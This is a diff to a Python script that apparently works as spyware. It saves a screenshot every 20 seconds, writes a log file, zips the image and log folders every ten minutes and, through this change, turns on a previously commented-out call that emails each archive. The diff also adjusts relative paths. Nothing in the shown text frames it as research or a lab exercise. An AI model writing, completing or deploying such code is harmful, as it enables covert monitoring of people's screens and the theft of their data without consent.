@@ -9,7 +9,7 @@ from email import encoders
 import zipfile
 import os
 
-log = open("Logs\\log.txt", "w")
+log = open("..\\..\\Logs\\log.txt", "w")
 
 image_counter = 1
 zip_counter = 1
@@ -92,18 +92,18 @@ def send_email(message):
 
 def thread_function():
     global zip_counter
-    folders=["..\\..\\..\\Images","..\\..\\..\\Logs"]
-    zip_name=f"..\\..\\..\\Rar Files\\Log{zip_counter}.zip"
+    folders=["..\\..\\Images","..\\..\\Logs"]
+    zip_name=f"..\\..\\Rar Files\\Log{zip_counter}.zip"
     zip_counter +=1
     convert_zip(folders,zip_name)
-    # send_email(zip_name)
+    send_email(zip_name)
     timer_object = threading.Timer(600,thread_function)
     timer_object.start()
 
 def take_screenshot():
     global image_counter
     ekran=pyautogui.screenshot()
-    ekran.save(f"..\\..\\..\\Images\\ekran{image_counter}.jpg")
+    ekran.save(f"..\\..\\Images\\ekran{image_counter}.jpg")
     image_counter += 1
     timer_object = threading.Timer(20,take_screenshot)
     timer_object.start()
